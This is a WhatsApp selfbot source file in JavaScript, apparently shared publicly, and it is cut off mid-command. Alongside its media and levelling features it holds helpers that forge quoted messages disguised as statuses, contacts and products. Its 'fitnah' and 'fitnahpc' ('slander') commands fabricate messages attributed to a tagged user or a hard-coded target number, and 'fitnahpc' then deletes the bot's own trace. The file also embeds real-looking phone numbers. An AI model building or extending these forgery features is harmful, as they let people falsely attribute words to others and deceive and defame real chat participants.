// RECODE? ERROR? MAMPUS!!!
//JANGAN DI JUAL OM
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES, 
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const {convertSticker} = require("./lib/swm.js")
const { isFiltered, addFilter } = require('./lib/antispam')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const { uploadimg } = require('./lib/uploadimg')

const { help, help2 } = require('./message')

//Archivos JSON
const _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/level.json'))
const afk = JSON.parse(fs.readFileSync('./database/off.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
const image = JSON.parse(fs.readFileSync('./database/img.json'))
const setting = JSON.parse(fs.readFileSync('./database/setting.json'))


banChats = true
offline = false
targetpc = '56950805080'
ownerNumber = ["5511940006334@s.whatsapp.net"]
fake = 'SELFBOT WHATSAPP'
numbernye = '0'
waktu = '-'
fakeimg = fs.readFileSync('./stik/fake.jpeg')
alasan = '-'
//=================================================//
        module.exports = FxBot = async (FxBot, mek) => {
        try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
        if (!mek.message) return
        if (mek.key && mek.key.remoteJid == 'status@broadcast') return
        global.blocked
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
        const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
		const senderme = mek.participant
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const meNumber = FxBot.user.jid.split("@")[0]
		const botNumber = FxBot.user.jid
		const isMe = botNumber.includes(senderme)
		const botNumberss = FxBot.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		button = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
		const isOwner = ownerNumber.includes(sender)
		const totalchat = await FxBot.chats.all()
		const groupMetadata = isGroup ? await FxBot.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const conts = mek.key.fromMe ? FxBot.user.jid : FxBot.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? FxBot.user.name : conts.notify || conts.vname || conts.name || '-'
        const isWelkom = isGroup ? welkom.includes(from) : false		
        const isBanned = ban.includes(sender)
        const isNsfw = isGroup ? nsfw.includes(from) : false
        //MESS
		mess = {
			wait: '「 ❗ 」 En Proceso, Aguarda!',
			success: '「 ❗ 」 Uff Comando Con Exito',
			nsfwoff: '「 ❗ 」La Funcion De Nsfw No Está Activa!',
			wrongFormat: '「 ❗ 」 Wey No Seas Pendejo Escribe Bien El Formato',
			waitmusic: '「 ❗ 」 Espera! Estoy buscando tu musica\nEn cuánto la encuentre la envío!!',
			waitimg: '「 ❗ 」 Espera! Estoy creando tu imagen!',
			nsfwoff: '「 ❗ 」La Funcion De Nsfw No Está Activa!',
					musica: '「 ❗ 」Espera un momento, estoy buscando tu canción, recuerda suscribirte a mi canal de YouTube',
			imageoff: '「 ❗ 」No Puedo Enviar Fotos Mientras No Esta Activa La Función!',
			error: {
				stick: '「 ❗ 」F no se pudo convertir:/',
				errostick: '❌Error al crear el sticker❌',
				Iv: '「 ❗ 」Link Invalido Weon'
			},
			only: {
				group: '「 ❗ 」Este Comando Solo Puede Ser Usado En Grupos',
				admin: '「 ❗ 」No Eres Admin 💩',
				Badmin: '「 ❗ 」 Necesito Ser Admin Para Este Comando'
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            FxBot.sendMessage(from, teks, text, {quoted:mek})
        }

        const sendMess = (hehe, teks) => {
            FxBot.sendMessage(hehe, teks, text, {sendEphemeral: true})
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? FxBot.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : FxBot.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const costum = (pesan, tipe, target, target2) => {
                 FxBot.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
        }
        //FAKEH
const fakekontak = (teks) => {
FxBot.sendMessage(from, teks, MessageType.text, {
quoted: {
key: {
fromMe: false,
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {})
 },
message: {
 'contactMessage': {
 'displayName': `Hola ${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ucapanWaktu},;;;\nFN:${ucapanWaktu},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')
}
}
                }
            })
        }


					
        const fakethumb = (teks, yes) => {
            FxBot.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/fake.jpeg'),quoted: mek ,caption:yes})
        }
        const fakestatus = (teks) => {
            FxBot.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Hola ${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    },
                    contextInfo: {
                      "forwardingScore": 999, "isForwarded": true
                    }
                }
            })
        }
        const fakegroup = (teks) => {
            FxBot.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid : `17792492278@g.us` } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Hola ${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        run = process.uptime() 
            teks = `${kyun(run)}`
const fimg = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "imageMessage": { "mimetype": "image/jpeg","caption": teks, 'jpegThumbnail': fakeimg}}
}
contextInfo: {
mentionedJid: [sender]}

const txt1 = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "imageMessage": { "mimetype": "image/jpeg","caption": `© FxBot Team 🍡`, 'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}
}
contextInfo: {
mentionedJid: [sender]}

 const faketoko = (teks) => {
 FxBot.sendMessage(from, teks, text, {
quoted: {
 key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) 
}, message: {
'productMessage': {
'product': {
 'productImage':{
'mimetype': 'image/jpeg',
 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')
},
'title': `Hola ${pushname}`,
'productImageCount': 9999
},
'businessOwnerJid': `0@s.whatsapp.net`
}
}
                }
            })
        }
        const fvid = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "videoMessage": { "caption":"𝐹𝑒𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇 🍡", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}
}
contextInfo: {
mentionedJid: [sender]}

        const producto = (teks) => {
 FxBot.sendMessage(from, teks, text, {
quoted: {
 key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) 
}, message: {
'productMessage': {
'product': {
 'productImage':{
'mimetype': 'image/jpeg',
 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')
},
'title': `${fake}`,
'productImageCount': 0
},
'businessOwnerJid': `0@s.whatsapp.net`
}
}
                }
            })
        }
        const ftroli = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 1,message: `${fake}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: '0@s.whatsapp.net'}}}
const faketokoforwaded = (teks) => {
	anu = {
	  key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./stik/thumb.jpeg`)
					},
					"title": `Hola ${pushname}, ${ucapanWaktu}`,
					"retailerId": "Self Bot",
					"productImageCount": 1
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
	FxBot.sendMessage(from, teks, text, {
	  quoted: anu,
	  contextInfo:{
	    "forwardingScore": 999, "isForwarded": true
	  }
	})
}
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        FxBot.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
           
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    FxBot.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
    //> Nivel <
const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const jadiUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            user.push(obj)
            fs.writeFileSync('./database/user.json', JSON.stringify(user))
        }
        const bikinSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/level.json', JSON.stringify(_level))
        }
			//[-- Barra De Nivel --]
			var per = '*[▒▒▒▒▒▒▒▒▒▒] 0%*'
			const peri = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
			const perl = peri-getLevelingXp(sender) 
			const resl = Math.round(100-((perl/getLevelingXp(sender))*100))
			if (resl <= 10) {
				per = `*[█▒▒▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 20) {
				per = `*[██▒▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 30) {
				per = `*[███▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 40) {
				per = `*[████▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 50) {
				per = `*[█████▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 60) {
				per = `*[██████▒▒▒▒] ${resl}%*`
			} else if (resl <= 70) {
				per = `*[███████▒▒▒] ${resl}%*`
			} else if (resl <= 80) {
				per = `*[████████▒▒] ${resl}%*`
			} else if (resl <= 90) {
				per = `*[█████████▒] ${resl}%*`
			} else if (resl <= 100) {
				per = `*[██████████] ${resl}%*`
			} 
			/*[-- RANGOS --]*/
			const levelRole = getLevelingLevel(sender)
   	     var role = 'Bronze l'
   	     if (levelRole <= 3) {
   	         role = 'Bronze ll'
   	     } else if (levelRole <= 5) {
   	         role = 'Bronze lll'
   	     } else if (levelRole <= 7) {
   	         role = 'Oro l'
   	     } else if (levelRole <= 8) {
   	         role = 'Oro ll'
   	     } else if (levelRole <= 9) {
   	         role = 'Oro lll'
   	     } else if (levelRole <= 10) {
   	         role = 'Platino l'
   	     } else if (levelRole <= 11) {
   	         role = 'Platino ll'
   	     } else if (levelRole <= 12) {
   	         role = 'Platino lll'
   	     } else if (levelRole <= 13) {
   	         role = 'Diamante l'
   	     } else if (levelRole <= 14) {
   	         role = 'Diamante ll'
   	     } else if (levelRole <= 14) {
   	         role = 'Diamante lll'
   	     } else if (levelRole <= 15) {
   	         role = 'Diamante llll'
   	     } else if (levelRole <= 16) {
   	         role = 'Heroico l'
   	     } else if (levelRole <= 17) {
   	         role = 'Heroico ll'
   	     } else if (levelRole <= 18) {
   	         role = 'Heroico lll'
   	     } else if (levelRole <= 19) {
   	         role = 'Gran Maestro l'
   	     } else if (levelRole <= 20) {
   	         role = 'Gran Maestro ll'
   	     } else if (levelRole <= 21) {
   	         role = 'Gran Maestro lll'
   	     } else if (levelRole <= 22) {
   	         role = 'Lider Supremo'
   	     } else if (levelRole <= 23) {
   	         role = 'Titan😈'
   	     }
   //Function Level Up
const levelup = (pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role) => {
	fakekontak(`\n*「 FELICIDADES 」*\n┌ *Nombre* : ${pushname}\n├ *Número* : wa.me/${sender.split("@")[0]}\n├  *XP* : ${getLevelingXp(sender)}\n├ *Rango*: ${role}\n└  *Nivel* : ${getLevel} ⊱ ${getLevelingLevel(sender)}`)
}
//Function Level
            if (isGroup) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    await fakestatus(levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))
                }
            } catch (err) {
                console.error(err)
            }
        }
//=====================//      
         // Tiempo horario
        const hour_now = moment().format('HH')
        var ucapanWaktu = 'Buenos Dias 🌝👋'
        if (hour_now >= '03' && hour_now <= '10') {
          ucapanWaktu = 'Buenos Dias 🌝👋'
        } else if (hour_now >= '10' && hour_now <= '14') {
          ucapanWaktu = 'Buenas Tardes 🌆'
        } else if (hour_now >= '14' && hour_now <= '17') {
          ucapanWaktu = 'Buenas Tardes 🌆'
        } else if (hour_now >= '17' && hour_now <= '18') {
          ucapanWaktu = 'Buenas Tardes 🌆'
        } else if (hour_now >= '18' && hour_now <= '23') {
          ucapanWaktu = 'Buenas Noches 🌚'
        } else {
          ucapanWaktu = 'Buenas Noches 🌚'
        }
//========================================================================================================================//
		colors = ['blue']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
		if (isCmd && isBanned) {
        return console.log(color('[ USUÁRIO BANEADO ] Ignorando comando', 'blue'), color(moment.tz('America/México').format('HH:mm:ss'), 'yellow'), color(`${command}`),'DE:', color(pushname))}
    	if (!isGroup && isCmd) console.log('\x1b[1;37m>', '[ \x1b[1;36mMensaje\x1b[1;37m ]', time, color(command), 'De', color(sender.split('@')[0]))
        if (isCmd && isGroup) console.log('\x1b[1;37m>', '[ \x1b[1;36mMensaje\x1b[1;37m ]', time, color(command), 'De', color(sender.split('@')[0]), 'En', color(groupName))

if (mek.message.stickerMessage) {
            let stickerKey = mek.message.stickerMessage.fileSha256.toString('base64');
            if(stickerKey=="G+f4o9Z/5iYsY/gCxFbYcG8K3BeImZYcPK7khx2QLg4="){
            if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
            await FxBot.groupRemove(mek.key.remoteJid, [mek.message.stickerMessage.contextInfo.participant])
        }
        }


			switch(command) {
    case 'menu':
    case 'help':
    const timestampp = speed();
	const latensii = speed() - timestampp
	run = process.uptime() 
    teks = `${kyun(run)}`
    try {
pic = await FxBot.getProfilePicture(sender)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
gambar = await getBuffer(pic)
mhan = await FxBot.prepareMessage(from, gambar, image, {thumbnail: gambar})
gbutsan = [
  {buttonId: 'CREADOR', buttonText: {displayText: 'CREADOR'}, type: 1},
  {buttonId: 'YOUTUBE', buttonText: {displayText: 'YOUTUBE'}, type: 1},
]
 gbuttonan = {
imageMessage: mhan.message.imageMessage,
    contentText: help.menu(pushname, sender, prefix, banChats, ucapanWaktu),
    footerText: `Speed    : ${latensii.toFixed(4)} Second\nRuntime : ${teks}\n\n𝑪𝑹𝑬𝑨𝑻𝑶𝑹 𝑩𝑶𝑻 𝑾𝑯𝑨𝑻𝑺𝑨𝑷𝑷\n© By FxBot`,
    buttons: gbutsan,
    headerType: 4
}
await FxBot.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./stik/fake.jpeg'),
        caption: help.menu(pushname, sender, prefix, banChats, ucapanWaktu),
        "contextInfo": {
            mentionedJid: [sender]},
            quoted: ftroli})
           	break
    case 'on':
            if (!mek.key.fromMe) return 
            offline = false
            FxBot.sendMessage (from, 'ENCENDIDO', MessageType.text, {quoted: txt1, "forwardingScore": 9999, "isForwarded": true})
            break       
    case 'status':
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!mek.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            FxBot.sendMessage (from, 'APAGADO', MessageType.text, {quoted: txt1, "forwardingScore": 9999, "isForwarded": true})
            break   
    case 'get':
            if(!q) return reply('¿Y el enlace?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
    case 'contag':
            if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            FxBot.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
    case 'stickertag':
    if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await FxBot.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await FxBot.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            FxBot.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    
    case 'fitnah':
    if (!mek.key.fromMe) return 
            if (args.length < 1) return reply(`Ejemplo de uso :\n${prefix}fitnah [@tag|mensaje|respuesta del bot]]\n\nEjemplo : \n${prefix}fitnah @tag|Hola|Hola también`)
            var gh = args.join ('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            FxBot.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Éxito Cambiando el objetivo de slanderpc : ${targetpc}`)
            break
    case 'fitnahpc':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await FxBot.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await FxBot.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Responde un video!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await FxBot.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            FxBot.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek, caption:'𝐹??𝑙𝑖𝑥𝑐𝑟𝑎𝑐𝑘 𝐵𝑂𝑇 🍡'})
